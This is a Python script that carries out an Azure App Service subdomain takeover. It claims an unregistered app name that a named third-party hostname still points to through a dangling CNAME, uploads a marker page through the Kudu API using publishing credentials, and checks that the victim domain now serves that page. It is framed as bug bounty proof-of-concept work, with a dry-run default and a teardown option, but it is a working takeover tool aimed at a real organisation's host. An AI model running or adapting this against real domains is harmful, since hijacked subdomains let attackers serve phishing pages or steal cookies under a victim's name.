#!/usr/bin/env python3
"""Claim a free Azure App Service name that a victim hostname still CNAMEs to, then prove it from the
victim's side.

Why this namespace is claimable where ELB is not: an App Service hostname is
`<app-name>.azurewebsites.net` and the app name is *typed in full* by whoever creates the site. There
are no provider-generated segments, so creating an app called `testemeraldangulardemo` produces exactly
the hostname the dangling CNAME points at — the create-then-compare test the ELB queue fails.

The gate order is deliberate and each step can end the run:

  1. the label comes from the measured queue, never invented
  2. the victim host still publishes the CNAME to that label right now
  3. Azure's own `checknameavailability` says the name is free (this is what separates a dead app from
     an owned-but-dark one — `donauchemie-dev` reads dead in DNS but is *not* available)
  4. create the app on a Free (F1) plan, then read the hostname back and compare it to the target
  5. photograph the victim host serving our marker, then delete everything

Publishing credentials are used in-process to write one static marker file and are never printed or
persisted. Free tier keeps the proof at $0 while it exists.

  python3 engine/azure_web_claim.py --label testemeraldangulardemo --host test.angulardemo.emerald.cbre.com --apply
"""
from __future__ import annotations

import argparse
import base64
import json
import os
import shutil
import subprocess
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
ARM = "https://management.azure.com"
MARKER = "subdomain takeover proof — this Azure App Service name was unclaimed; held by RDW Labz for a bug bounty submission, removable on request"


def token() -> str:
    import msal
    cache = msal.SerializableTokenCache()
    cache.deserialize(open(os.path.expanduser("~/.azure/msal_token_cache.json")).read())
    app = msal.PublicClientApplication("04b07795-8ddb-461a-bbee-02f9e1bf7b46",
                                       authority="https://login.microsoftonline.com/organizations",
                                       token_cache=cache)
    acc = app.get_accounts()[0]
    r = app.acquire_token_silent(["https://management.azure.com/.default"], account=acc)
    if not r or "access_token" not in r:
        raise SystemExit(f"no silent ARM token: {r and r.get('error')}")
    return r["access_token"]


def arm(tok: str, method: str, path: str, body: dict | None = None, timeout: int = 180):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(ARM + path, data=data, method=method,
                                 headers={"Authorization": f"Bearer {tok}",
                                          "Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read() or b"{}"
            return r.status, (json.loads(raw) if raw.strip() else {})
    except urllib.error.HTTPError as e:
        raw = e.read() or b"{}"
        try:
            return e.code, json.loads(raw)
        except Exception:
            return e.code, {"raw": raw[:300].decode(errors="replace")}


def dig(name: str, rtype: str = "CNAME") -> str:
    try:
        p = subprocess.run(["dig", "+short", "+time=4", "+tries=2", rtype, name],
                           capture_output=True, text=True, timeout=12)
        return " ".join(p.stdout.split()).rstrip(".")
    except Exception:
        return ""


def available(tok: str, sub: str, label: str) -> bool:
    code, body = arm(tok, "POST",
                     f"/subscriptions/{sub}/providers/Microsoft.Web/checknameavailability?api-version=2022-03-01",
                     {"name": label, "type": "Microsoft.Web/sites"})
    return bool(body.get("nameAvailable"))


def wait_ready(tok: str, sub: str, rg: str, name: str, tries: int = 40) -> dict:
    for _ in range(tries):
        code, body = arm(tok, "GET",
                         f"/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Web/sites/{name}"
                         "?api-version=2022-03-01")
        state = body.get("properties", {}).get("state", "")
        if state.lower() == "running":
            return body
        time.sleep(6)
    return body


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--label", required=True)
    ap.add_argument("--host", required=True)
    ap.add_argument("--rg", default="rg-takeover-poc")
    ap.add_argument("--location", default="westeurope")
    ap.add_argument("--sub", default=os.environ.get("AZ_SUB", ""))
    ap.add_argument("--apply", action="store_true")
    ap.add_argument("--delete", action="store_true")
    a = ap.parse_args()

    tok = token()
    sub = a.sub
    if not sub:
        code, body = arm(tok, "GET", "/subscriptions?api-version=2022-12-01")
        subs = [s for s in body.get("value", []) if s.get("state") == "Enabled"]
        sub = sorted(subs, key=lambda s: s["displayName"].lower().endswith("subscription"))[-1]["subscriptionId"]
    print(f"subscription {sub}")

    if a.delete:
        code, _ = arm(tok, "DELETE", f"/subscriptions/{sub}/resourceGroups/{a.rg}?api-version=2021-04-01")
        print("delete resource group: HTTP", code)
        return 0

    queue = json.loads((ROOT / "reports/claimable-queue.json").read_text())
    row = next((r for r in queue if r.get("label") == a.label and r["host"] == a.host), None)
    if not row:
        raise SystemExit(f"({a.label}, {a.host}) is not in reports/claimable-queue.json — refusing")
    cname = dig(a.host)
    print(f"victim {a.host} -> CNAME {cname or '(none)'}")
    if not cname.lower().startswith(a.label.lower() + "."):
        raise SystemExit("the victim host no longer points at this label — the record was withdrawn")
    if not available(tok, sub, a.label):
        raise SystemExit(f"{a.label} is NOT available — the app still exists (owned-but-dark), "
                         "which is evidence only, never a takeover")
    print(f"name {a.label} is available")
    if not a.apply:
        print("dry run — nothing created")
        return 0

    arm(tok, "PUT", f"/subscriptions/{sub}/resourceGroups/{a.rg}?api-version=2021-04-01",
        {"location": a.location})
    plan = f"plan-poc-{a.label}"[:40]
    code, body = arm(tok, "PUT",
                     f"/subscriptions/{sub}/resourceGroups/{a.rg}/providers/Microsoft.Web/serverfarms/"
                     f"{plan}?api-version=2022-03-01",
                     {"location": a.location, "sku": {"name": "F1", "tier": "Free", "capacity": 1},
                      "properties": {"reserved": False}})
    print(f"  plan {plan}: HTTP {code}")
    code, body = arm(tok, "PUT",
                     f"/subscriptions/{sub}/resourceGroups/{a.rg}/providers/Microsoft.Web/sites/"
                     f"{a.label}?api-version=2022-03-01",
                     {"location": a.location,
                      "properties": {"serverFarmId": f"/subscriptions/{sub}/resourceGroups/{a.rg}"
                                                     f"/providers/Microsoft.Web/serverfarms/{plan}"}})
    print(f"  site {a.label}: HTTP {code} {(body.get('error') or {}).get('message', '')[:120]}")
    if code >= 400:
        return 1

    site = wait_ready(tok, sub, a.rg, a.label)
    got = site.get("properties", {}).get("defaultHostName", "")
    print(f"  created hostname: {got}")
    if got.lower() != f"{a.label}.azurewebsites.net":
        raise SystemExit(f"MISMATCH: azure gave {got!r}, target is {a.label}.azurewebsites.net "
                         "— create-then-compare failed, no takeover")

    # one static marker page via Kudu VFS; credentials stay in this process
    code, pub = arm(tok, "POST",
                    f"/subscriptions/{sub}/resourceGroups/{a.rg}/providers/Microsoft.Web/sites/"
                    f"{a.label}/config/publishingcredentials/list?api-version=2022-03-01")
    if code < 400 and pub.get("properties"):
        user = pub["properties"]["publishingUserName"]
        pw = pub["properties"]["publishingPassword"]
        auth = base64.b64encode(f"{user}:{pw}".encode()).decode()
        html = (f"<!doctype html><title>takeover proof</title><h1>Takeover proof</h1>"
                f"<p>{MARKER}</p>")
        for target in ("/api/vfs/site/wwwroot/index.html", "/api/vfs/site/wwwroot/hostingstart.html"):
            req = urllib.request.Request(
                f"https://{a.label}.scm.azurewebsites.net{target}", data=html.encode(), method="PUT",
                headers={"Authorization": f"Basic {auth}", "If-Match": "*"})
            try:
                with urllib.request.urlopen(req, timeout=90) as r:
                    print(f"  wrote {target}: HTTP {r.status}")
            except urllib.error.HTTPError as e:
                print(f"  wrote {target}: HTTP {e.code}")

    time.sleep(20)
    ev = ROOT / f"reports/evidence-{a.host.replace('/', '_')}"
    ev.mkdir(parents=True, exist_ok=True)
    proof = []
    for scheme in ("http", "https"):
        url = f"{scheme}://{a.host}/"
        out = subprocess.run(["curl", "-sS", "--max-time", "20", "-i", url],
                             capture_output=True, text=True).stdout
        (ev / f"proof-{scheme}.txt").write_text(out)
        hit = MARKER in out or "azurewebsites" in out.lower() or "Your app service" in out
        proof.append((url, hit, out.split("\r\n")[0] if out else "no response"))
    for url, hit, first in proof:
        print(f"  {url:44} {'SERVES OUR CONTENT' if hit else 'not serving yet'}  {first[:60]}")
    (ev / "claim.json").write_text(json.dumps({"host": a.host, "label": a.label, "sub": sub,
                                               "rg": a.rg, "plan": plan,
                                               "hostname": got, "at": time.strftime("%FT%TZ", time.gmtime())},
                                              indent=1))
    subprocess.run(["dig", "+short", "CNAME", a.host], capture_output=True, text=True)
    print(f"\nevidence in {ev}")
    print(f"torn down with: python3 engine/azure_web_claim.py --label {a.label} --host {a.host} --delete")
    return 0 if all(p[1] for p in proof) else 2


if __name__ == "__main__":
    sys.exit(main())
